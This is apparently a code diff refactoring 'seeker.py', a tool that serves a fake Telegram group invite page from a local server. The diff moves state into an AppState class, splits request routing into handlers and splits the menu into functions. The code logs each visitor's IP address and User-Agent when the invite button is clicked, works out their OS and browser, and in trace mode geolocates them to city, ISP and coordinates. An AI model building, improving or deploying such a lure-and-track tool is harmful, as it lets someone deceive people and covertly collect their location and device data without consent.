@@ -10,10 +10,18 @@ import urllib.request
 import json
 import socket
 import os
+import ipaddress
+import logging
+
+def is_private_ip(ip_str: str) -> bool:
+    try:
+        return ipaddress.ip_address(ip_str).is_private
+    except ValueError:
+        return True  # Invalid IP → treat as private/skip
 
 def lookup_ip(ip):
     # Skip lookup for local and loopback addresses
-    if ip in ("127.0.0.1", "localhost") or ip.startswith("192.168.") or ip.startswith("10.") or ip.startswith("172.16.") or ip.startswith("172.31.") or ip.startswith("172.20.") or ip.startswith("172.21.") or ip.startswith("172.22.") or ip.startswith("172.23.") or ip.startswith("172.24.") or ip.startswith("172.25.") or ip.startswith("172.26.") or ip.startswith("172.27.") or ip.startswith("172.28.") or ip.startswith("172.29.") or ip.startswith("172.30."):
+    if is_private_ip(ip):
         return {"status": "fail", "message": "Private/Local IP"}
     try:
         url = f"http://ip-api.com/json/{ip}"
@@ -63,8 +71,31 @@ WHITE = '\033[97m'
 BOLD = '\033[1m'
 RESET = '\033[0m'
 
-# Global trace flag
-trace_enabled = False
+class AppState:
+    def __init__(self):
+        self.trace_enabled: bool = False
+        self._servers: list = []
+        self._lock = threading.Lock()
+    
+    def add_server(self, httpd):
+        with self._lock:
+            self._servers.append(httpd)
+            
+    def remove_server(self, httpd):
+        with self._lock:
+            if httpd in self._servers:
+                self._servers.remove(httpd)
+    
+    def stop_all(self):
+        with self._lock:
+            for httpd in self._servers:
+                try:
+                    httpd.shutdown()
+                    httpd.server_close()
+                except Exception as e:
+                    logging.warning(f"Error stopping server: {e}")
+            self._servers.clear()
+
 
 BANNER = f"""{RED}{BOLD}
       .---.
@@ -84,114 +115,49 @@ BANNER = f"""{RED}{BOLD}
 {RESET}{CYAN}      [ SEER INVITE TEMPLATE TOOL ]{RESET}
 """
 
-# Track running HTTP servers to stop/close them when returning to the home screen
-active_servers = []
-
-def stop_active_servers():
-    global active_servers
-    for httpd in list(active_servers):
-        try:
-            httpd.shutdown()
-            httpd.server_close()
-        except Exception:
-            pass
-    active_servers.clear()
 
 class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
     """Custom request handler that silences standard terminal logs for a clean console,
     and automatically redirects the root path '/' to '/index.html' while preserving query params."""
     def log_message(self, format, *args):
         pass
+
+    @property
+    def _routes(self):
+        return {
+            "/log": self._handle_log,
+            "/": self._handle_root
+        }
         
     def do_GET(self):
-        # Log visitor IP when they click the button (requests /log endpoint)
-        parsed_url = urllib.parse.urlparse(self.path)
-        if parsed_url.path == "/log":
-            parsed_qs = urllib.parse.parse_qs(parsed_url.query)
-            client_ip = parsed_qs.get('ip', [self.client_address[0]])[0]
-            ua = self.headers.get('User-Agent', '')
-            # Detect OS from User-Agent (mobile checks first to avoid false matches)
-            if 'iPhone' in ua or 'iPad' in ua:
-                os_info = 'iOS'
-            elif 'Android' in ua:
-                os_info = 'Android'
-            elif 'Windows' in ua:
-                os_info = 'Windows'
-            elif 'Mac OS X' in ua:
-                os_info = 'macOS'
-            elif 'Linux' in ua:
-                os_info = 'Linux'
-            else:
-                os_info = 'Unknown'
+        parsed = urllib.parse.urlparse(self.path)
+        handler = self._routes.get(parsed.path, self._serve_file)
+        handler(parsed)
 
-            # Detect browser and version from User-Agent
-            def extract_version(token):
-                start = ua.find(token)
-                if start == -1:
-                    return token
-                end = ua.find(' ', start)
-                if end == -1:
-                    end = len(ua)
-                return ua[start:end].strip(';')
+    def _handle_log(self, parsed):
+        client_ip = self._extract_ip(parsed)
+        ua = self.headers.get("User-Agent", "")
+        self.server.on_visitor(client_ip, ua)
+        self._respond(200, "text/plain", b"OK")
 
-            if 'Edg/' in ua:
-                browser = extract_version('Edg/').split('/')[0]
-            elif 'OPR/' in ua:
-                browser = extract_version('OPR/').split('/')[0]
-            elif 'Opera/' in ua:
-                browser = extract_version('Opera/').split('/')[0]
-            elif 'Chrome/' in ua and 'Edg/' not in ua and 'OPR/' not in ua:
-                browser = extract_version('Chrome/').split('/')[0]
-            elif 'Firefox/' in ua:
-                browser = extract_version('Firefox/').split('/')[0]
-            elif 'Safari/' in ua and 'Chrome/' not in ua:
-                browser = 'Safari'
-            else:
-                browser = 'Unknown'
+    def _handle_root(self, parsed):
+        target = f"/index.html?{parsed.query}" if parsed.query else "/index.html"
+        self.send_response(302)
+        self.send_header("Location", target)
+        self.end_headers()
 
-            if trace_enabled:
-                print(f"\n{GREEN}[+] Public IP: {YELLOW}{client_ip}{RESET}")
-                
-                # Perform IP Geolocation Lookup
-                geo = lookup_ip(client_ip)
-                if geo and geo.get("status") == "success":
-                    country = geo.get("country", "Unknown")
-                    country_code = geo.get("countryCode", "")
-                    region = geo.get("regionName", "Unknown")
-                    city = geo.get("city", "Unknown")
-                    isp = geo.get("isp", "Unknown")
-                    
-                    country_str = f"{country} ({country_code})" if country_code else country
-                    print(f"{GREEN}[+] Location:  {YELLOW}{city}, {region}, {country_str}{RESET}")
-                    print(f"{GREEN}[+] ISP:       {YELLOW}{isp}{RESET}")
-                else:
-                    msg = geo.get("message", "Lookup failed / Private IP") if geo else "Lookup failed"
-                    print(f"{RED}[!] IP Lookup:  {YELLOW}{msg}{RESET}")
-                    
-                print(f"{GREEN}[+] OS:        {YELLOW}{os_info}{RESET}")
-                print(f"{GREEN}[+] Browser:   {YELLOW}{browser}{RESET}")
-            else:
-                # Default mode: print a clean, single-line notification
-                print(f"\n{GREEN}[+] Visitor connected from IP: {YELLOW}{client_ip}{RESET} ({os_info}, {browser})")
-            self.send_response(200)
-            self.send_header('Content-Type', 'text/plain')
-            self.end_headers()
-            self.wfile.write(b'OK')
-            return
-
-        # If accessing the root path "/", redirect it to "/index.html" with query parameters
-        if parsed_url.path == "/" or parsed_url.path == "":
-            query = parsed_url.query
-            new_path = "/index.html"
-            if query:
-                new_path += f"?{query}"
-            self.send_response(302)
-            self.send_header('Location', new_path)
-            self.end_headers()
-            return
-
-        # Otherwise serve files normally
+    def _serve_file(self, parsed):
         super().do_GET()
+
+    def _extract_ip(self, parsed) -> str:
+        parsed_qs = urllib.parse.parse_qs(parsed.query)
+        return parsed_qs.get('ip', [self.client_address[0]])[0]
+
+    def _respond(self, code: int, content_type: str, body: bytes):
+        self.send_response(code)
+        self.send_header('Content-Type', content_type)
+        self.end_headers()
+        self.wfile.write(body)
 
 class SilentThreadingTCPServer(socketserver.ThreadingTCPServer):
     """Threading TCP Server that suppresses noisy ConnectionResetError exceptions
@@ -205,12 +171,81 @@ class SilentThreadingTCPServer(socketserver.ThreadingTCPServer):
         # Suppress other connection-related traceback printouts to maintain a clean console
         pass
 
-def run_server(port, target_url):
+    def on_visitor(self, client_ip: str, ua: str):
+        # Detect OS from User-Agent (mobile checks first to avoid false matches)
+        if 'iPhone' in ua or 'iPad' in ua:
+            os_info = 'iOS'
+        elif 'Android' in ua:
+            os_info = 'Android'
+        elif 'Windows' in ua:
+            os_info = 'Windows'
+        elif 'Mac OS X' in ua:
+            os_info = 'macOS'
+        elif 'Linux' in ua:
+            os_info = 'Linux'
+        else:
+            os_info = 'Unknown'
+
+        # Detect browser and version from User-Agent
+        def extract_version(token):
+            start = ua.find(token)
+            if start == -1:
+                return token
+            end = ua.find(' ', start)
+            if end == -1:
+                end = len(ua)
+            return ua[start:end].strip(';')
+
+        if 'Edg/' in ua:
+            browser = extract_version('Edg/').split('/')[0]
+        elif 'OPR/' in ua:
+            browser = extract_version('OPR/').split('/')[0]
+        elif 'Opera/' in ua:
+            browser = extract_version('Opera/').split('/')[0]
+        elif 'Chrome/' in ua and 'Edg/' not in ua and 'OPR/' not in ua:
+            browser = extract_version('Chrome/').split('/')[0]
+        elif 'Firefox/' in ua:
+            browser = extract_version('Firefox/').split('/')[0]
+        elif 'Safari/' in ua and 'Chrome/' not in ua:
+            browser = 'Safari'
+        else:
+            browser = 'Unknown'
+
+        # Safely check if trace is enabled in the server's state
+        state_obj = getattr(self, 'state', None)
+        trace_enabled = state_obj.trace_enabled if state_obj else False
+        if trace_enabled:
+            print(f"\n{GREEN}[+] Public IP: {YELLOW}{client_ip}{RESET}")
+            
+            # Perform IP Geolocation Lookup
+            geo = lookup_ip(client_ip)
+            if geo and geo.get("status") == "success":
+                country = geo.get("country", "Unknown")
+                country_code = geo.get("countryCode", "")
+                region = geo.get("regionName", "Unknown")
+                city = geo.get("city", "Unknown")
+                isp = geo.get("isp", "Unknown")
+                
+                country_str = f"{country} ({country_code})" if country_code else country
+                print(f"{GREEN}[+] Location:  {YELLOW}{city}, {region}, {country_str}{RESET}")
+                print(f"{GREEN}[+] ISP:       {YELLOW}{isp}{RESET}")
+            else:
+                msg = geo.get("message", "Lookup failed / Private IP") if geo else "Lookup failed"
+                print(f"{RED}[!] IP Lookup:  {YELLOW}{msg}{RESET}")
+                
+            print(f"{GREEN}[+] OS:        {YELLOW}{os_info}{RESET}")
+            print(f"{GREEN}[+] Browser:   {YELLOW}{browser}{RESET}")
+        else:
+            # Default mode: print a clean, single-line notification
+            print(f"\n{GREEN}[+] Visitor connected from IP: {YELLOW}{client_ip}{RESET} ({os_info}, {browser})")
+
+def run_server(port, target_url, state):
     handler = CustomHTTPRequestHandler
     
     try:
         with SilentThreadingTCPServer(("", port), handler) as httpd:
-            active_servers.append(httpd)
+            httpd.state = state
+            state.add_server(httpd)
             # Auto-open browser in a separate thread after 0.5s
             def open_browser():
                 time.sleep(0.5)
@@ -223,8 +258,7 @@ def run_server(port, target_url):
             try:
                 httpd.serve_forever()
             finally:
-                if httpd in active_servers:
-                    active_servers.remove(httpd)
+                state.remove_server(httpd)
     except OSError:
         # Port already in use, fail gracefully in background
         pass
@@ -239,73 +273,59 @@ def get_input(prompt, default_value=""):
         print(f"\n{RED}[!] Exiting...{RESET}")
         sys.exit(0)
 
-def main():
-    # Force working directory to the directory where seeker.py resides
-    script_dir = os.path.dirname(os.path.abspath(__file__))
-    os.chdir(script_dir)
-    
+def select_menu() -> str:
+    print(f"{YELLOW}[!] Trace Mode :{RESET}\n")
+    print(f"{GREEN}[1]{RESET} Enable Trace")
+    print(f"{GREEN}[2]{RESET} seeker mode")
+    print(f"{GREEN}[3]{RESET} Exit Program")
+
     while True:
-        print(BANNER)
+        try:
+            trace_input = input(f"{GREEN}[>]{RESET} ")
+            cleaned_trace = trace_input.strip()
+            if cleaned_trace == "" or cleaned_trace == "2":
+                return "seeker"
+            elif cleaned_trace == "1":
+                return "trace"
+            elif cleaned_trace == "3":
+                return "exit"
+            else:
+                print(f"{RED}[!] Invalid choice. Select [1], [2], or [3].{RESET}")
+        except (KeyboardInterrupt, EOFError):
+            print(f"\n{RED}[!] Exiting...{RESET}")
+            sys.exit(0)
 
-        # Trace option prompt
-        print(f"{YELLOW}[!] Trace Mode :{RESET}\n")
-        print(f"{GREEN}[1]{RESET} Enable Trace")
-        print(f"{GREEN}[2]{RESET} seeker mode")
-        print(f"{GREEN}[3]{RESET} Exit Program")
+def run_trace_mode():
+    print(f"\n{YELLOW}[!] Trace Mode Enabled - IP Geolocation Lookup{RESET}")
+    while True:
+        target_ip = get_input("Enter Target IP Address : ")
+        if not target_ip:
+            break
+            
+        print(f"\n{GREEN}[*] Performing lookup for: {YELLOW}{target_ip}{RESET}")
+        geo = lookup_ip(target_ip)
+        if geo and geo.get("status") == "success":
+            country = geo.get("country", "Unknown")
+            country_code = geo.get("countryCode", "")
+            region = geo.get("regionName", "Unknown")
+            city = geo.get("city", "Unknown")
+            zip_code = geo.get("zip", "Unknown")
+            isp = geo.get("isp", "Unknown")
+            lat = geo.get("lat", "Unknown")
+            lon = geo.get("lon", "Unknown")
+            timezone = geo.get("timezone", "Unknown")
+            
+            country_str = f"{country} ({country_code})" if country_code else country
+            print(f"{GREEN}[+] Location:   {YELLOW}{city}, {region}, {country_str}{RESET}")
+            print(f"{GREEN}[+] Lat/Lon:    {YELLOW}{lat}, {lon}{RESET}")
+            print(f"{GREEN}[+] ISP:        {YELLOW}{isp}{RESET}")
+            print(f"{GREEN}[+] Timezone:   {YELLOW}{timezone}{RESET}")
+            print(f"{GREEN}[+] Zip Code:   {YELLOW}{zip_code}{RESET}\n")
+        else:
+            msg = geo.get("message", "Lookup failed") if geo else "Lookup failed"
+            print(f"{RED}[!] IP Lookup:   {YELLOW}{msg}{RESET}\n")
 
-        while True:
-            try:
-                trace_input = input(f"{GREEN}[>]{RESET} ")
-                cleaned_trace = trace_input.strip()
-                if cleaned_trace == "" or cleaned_trace == "2":
-                    trace = False
-                    break
-                elif cleaned_trace == "1":
-                    trace = True
-                    break
-                elif cleaned_trace == "3":
-                    print(f"\n{RED}[🛑] Exiting... Goodbye!{RESET}")
-                    sys.exit(0)
-                else:
-                    print(f"{RED}[!] Invalid choice. Select [1], [2], or [3].{RESET}")
-            except (KeyboardInterrupt, EOFError):
-                print(f"\n{RED}[!] Exiting...{RESET}")
-                sys.exit(0)
-
-        if trace:
-            print(f"\n{YELLOW}[!] Trace Mode Enabled - IP Geolocation Lookup{RESET}")
-            while True:
-                target_ip = get_input("Enter Target IP Address : ")
-                if not target_ip:
-                    break
-                    
-                print(f"\n{GREEN}[*] Performing lookup for: {YELLOW}{target_ip}{RESET}")
-                geo = lookup_ip(target_ip)
-                if geo and geo.get("status") == "success":
-                    country = geo.get("country", "Unknown")
-                    country_code = geo.get("countryCode", "")
-                    region = geo.get("regionName", "Unknown")
-                    city = geo.get("city", "Unknown")
-                    zip_code = geo.get("zip", "Unknown")
-                    isp = geo.get("isp", "Unknown")
-                    lat = geo.get("lat", "Unknown")
-                    lon = geo.get("lon", "Unknown")
-                    timezone = geo.get("timezone", "Unknown")
-                    
-                    country_str = f"{country} ({country_code})" if country_code else country
-                    print(f"{GREEN}[+] Location:   {YELLOW}{city}, {region}, {country_str}{RESET}")
-                    print(f"{GREEN}[+] Lat/Lon:    {YELLOW}{lat}, {lon}{RESET}")
-                    print(f"{GREEN}[+] ISP:        {YELLOW}{isp}{RESET}")
-                    print(f"{GREEN}[+] Timezone:   {YELLOW}{timezone}{RESET}")
-                    print(f"{GREEN}[+] Zip Code:   {YELLOW}{zip_code}{RESET}\n")
-                else:
-                    msg = geo.get("message", "Lookup failed") if geo else "Lookup failed"
-                    print(f"{RED}[!] IP Lookup:   {YELLOW}{msg}{RESET}\n")
-            continue
-        
-        # Break outer menu loop to proceed with website generation in seeker mode
-        break
-
+def run_seeker_mode(state):
     print(f"\n{YELLOW}[!] Select a Template :{RESET}\n")
     print(f"{GREEN}[1]{RESET} telegram (Default)")
 
@@ -329,28 +349,17 @@ def main():
     
     selected = templates[choice]
     print(f"\n{GREEN}[+]{RESET} Loading {YELLOW}{selected['name']}{RESET} Template...")
-    if trace:
-        print(f"{CYAN}[*]{RESET} Trace mode enabled - visitor activity will be logged.{RESET}")
     
-    # Use default parameters in Trace Mode; only prompt for customization in Default Mode
-    if trace:
-        title = selected["title"]
-        avatar = ""
-        desc = selected["desc"]
-        members = selected["members"]
-        online = selected["online"]
-    else:
-        title = get_input(f"Group Title : ", selected["title"])
-        avatar = get_input(f"Image Path / URL (Enter to skip) : ", "")
-        desc = get_input(f"Group Description : ", selected["desc"])
-        members = get_input(f"Number of Members : ", selected["members"])
-        online = get_input(f"Number of Members Online : ", selected["online"])
+    title = get_input(f"Group Title : ", selected["title"])
+    avatar = get_input(f"Image Path / URL (Enter to skip) : ", "")
+    desc = get_input(f"Group Description : ", selected["desc"])
+    members = get_input(f"Number of Members : ", selected["members"])
+    online = get_input(f"Number of Members Online : ", selected["online"])
     
     # Choose theme style - Forced to Light
     platform = selected["platform"]
     # Store trace setting for later use
-    global trace_enabled
-    trace_enabled = trace
+    state.trace_enabled = False
             
     port = find_free_port(8080)
         
@@ -375,7 +384,7 @@ def main():
     print(f"{GREEN}[+]{RESET} Starting Local Server...{GREEN}[ ✔ ]{RESET}")
     
     # Spawn Python HTTP Server in background thread
-    server_thread = threading.Thread(target=run_server, args=(port, target_url))
+    server_thread = threading.Thread(target=run_server, args=(port, target_url, state))
     server_thread.daemon = True
     server_thread.start()
     
@@ -388,14 +397,33 @@ def main():
     try:
         input(f"\n{GREEN}[+] Waiting for Client... [Press Enter to go to home / Ctrl+C to exit]{RESET}\n")
         print(f"\n{YELLOW}[!] Stopping server and returning to home...{RESET}")
-        stop_active_servers()
+        state.stop_all()
         time.sleep(0.5)
-        main()
-        sys.exit(0)
     except (KeyboardInterrupt, EOFError):
         print(f"\n\n{RED}Local server stopped. Goodbye!{RESET}")
-        stop_active_servers()
+        state.stop_all()
         sys.exit(0)
+
+def main():
+    # Force working directory to the directory where seeker.py resides
+    script_dir = os.path.dirname(os.path.abspath(__file__))
+    os.chdir(script_dir)
+    state = AppState()
+    
+    while True:                         # ← flat loop
+        print(BANNER)
+        choice = select_menu()
+        
+        if choice == "exit":
+            state.stop_all()
+            print(f"\n{RED}[🛑] Exiting... Goodbye!{RESET}")
+            break
+        elif choice == "trace":
+            run_trace_mode()
+        elif choice == "seeker":
+            run_seeker_mode(state)
+            
+    sys.exit(0)
 
 if __name__ == "__main__":
     main()
